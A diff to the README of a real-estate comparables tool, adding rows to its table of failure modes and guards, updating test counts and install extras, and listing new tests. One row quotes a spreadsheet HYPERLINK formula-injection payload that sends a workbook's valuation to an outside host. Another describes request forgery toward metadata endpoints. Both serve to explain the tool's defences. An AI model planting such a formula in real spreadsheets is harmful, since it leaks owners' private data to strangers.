@@ -114,6 +114,9 @@ These are real failures from real runs, and the reason each guard exists.
 | **The lot number that looks like a flat** | MLS records append a lot number to parcel addresses, so one sale appears both bare and suffixed — twice on one page, in one case a dollar apart. Counted twice, it shifts every statistic. | Address identity is profile-aware: a condo's `#2` is its identity, a parcel's `#18` is an artifact. Duplicates collapse into whichever row carries more, and the merge is reported. |
 | **Two parcels, one address** | The opposite failure, and worse. A 3.9-acre and a 5.14-acre parcel were listed at one street address, two hundred thousand dollars apart. Collapsing them as a duplicate deletes a real sale from every statistic and leaves no trace. | The address only selects candidates; **price decides**, with size breaking the tie. Genuinely distinct sales at one address are both kept and the sharing is reported. |
 | **The brokerage that becomes a person** | An index packs both sides into one string. Splitting `Sender Realty, Inc.` on its comma invents an agent called *Sender Realty* working for a firm called *Inc.* | The comma is not the seam. A name is claimed only where a licence label (`DRE #`, `CalBRE`) says a person is actually named; everything else is a firm listing itself. |
+| **One blank breaking every total** | A sale publishes no lot size. It renders as an em dash, because a gap stays a gap — and the spreadsheet then divides a price by that dash. Excel returns `#VALUE!`, and the error propagates into the average, the median, the min, the max and the core view above it. One missing field, five wrong headline figures, and every one of them visibly an error rather than a plausible number. | Both operands of every per-row formula are checked with `ISNUMBER` and yield a blank when either is missing; the aggregates over that column use `AVERAGEIFS`, which steps over a blank where `SUMPRODUCT` multiplies it as text and fails the same way. |
+| **A listing that writes its own formula** | A property page names its agent `=HYPERLINK("http://elsewhere/?v="&Summary!B5,"Jane Roe")`. It is only a string, so it survives extraction; verification checks a sale's price and date, not the spelling of a name, so it survives that too. In the workbook it becomes a live link that sends the owner's valuation to a stranger. | Fetched text is written as string-typed cells, so it reads exactly as fetched and can do nothing. Where a name is interpolated into a formula the engine builds, it is escaped — an unescaped quote closes the literal and the rest parses as syntax. |
+| **A record that redirects the fetcher** | An index names a property's page, and the tool fetches it next. An absolute URL passed through unchecked, so a compromised listing site could point at a cloud metadata endpoint or a service on localhost and have the response cached to disk and placed in a model prompt. `robots.txt` offers nothing here: a host serving none is treated as unrestricted. | A record may only link to the site it came from. Anything else is dropped and reported. |
 | **The agent who is not a person** | A property page named a buyer's agent: *Out Of Area Out Of Area*. It is MLS filler for "nobody", and it reads exactly like a name — it would have earned closings and a ranking in the agent table. | Placeholder names are recognised and rejected with a reason, rather than becoming a person. |
 | **The challenge page served as success** | A site answers an automated request with HTTP 200 and a "verify you are human" page. Read as content, it yields no listings — a silent zero that looks like a quiet market. | Response bodies are checked for challenge markers before being treated as results. |
 
@@ -166,7 +169,7 @@ That indirection is the difference between a profile layer that parameterizes th
 Build one interactively:
 
 ```bash
-recomps profiles new --market demoville
+recomps profiles --market demoville new
 ```
 
 ## Saved searches and saved runs
@@ -297,10 +300,11 @@ Run times are shown in local time. They are stored, named and compared in UTC �
 Working, in daily-usable shape, with limits worth stating plainly.
 
 **Solid.** The whole deterministic analysis — exclusions, statistics, the
-four valuation bases, pricing strategies, sold-to-ask, size bands, quadrants,
+four valuation bases, pricing strategies, sold-to-ask, size bands, the
+bracket ladder, quadrants,
 agents — reproduces a real hand-run analysis to the dollar. The workbook,
 snapshots, run history and reopening are done. The interface covers everything
-the command line does. 342 tests, all offline; a live run needs no test to
+the command line does. 360 tests, all offline; a live run needs no test to
 pass.
 
 **Working, with caveats.** Live research runs end to end against real sites
@@ -338,9 +342,12 @@ pytest
 recomps run --market demoville --offline --as-of 2026-08-31
 ```
 
-Three optional extras, so the engine and the whole test suite install without
-any of them: `live` (the Anthropic SDK and an HTTP client), `ui` (Streamlit),
-`dev` (pytest and ruff).
+Three optional extras: `live` (the Anthropic SDK, an HTTP client and pydantic),
+`ui` (Streamlit and pandas), `dev` (pytest, pytest-cov and ruff). The engine and
+the demo run install and work with none of them, and CI proves it on a bare
+`pip install -e .`. The test suite needs `dev`, and needs `live` and `ui` too
+if you want all of it — without them the research and interface tests skip
+rather than fail, and you get 173 of 360.
 
 Live research against a market's real sources:
 
@@ -374,7 +381,10 @@ grouping; address identity under both profile rules; the verification pass
 accepting a drifted date but rejecting a decades-old sale; that no workbook
 formula names a column letter; that a non-land profile genuinely reshapes the
 sheet; that opening a saved run recomputes nothing; that renaming a search moves its
-archived runs with it and refuses a name already taken; that size bands hold
+archived runs with it and refuses a name already taken; that fetched text
+cannot become a formula or escape one the engine builds; that a record may only
+link to its own site; that a rate needs both a price and a size; that a run
+asks before spending on per-property lookups and records a refusal; that size bands hold
 comparable samples and that a sale with no size is counted rather than dropped;
 that the core view's workbook figures are formulas over its editable bounds
 rather than values; that two genuinely different parcels at one street address
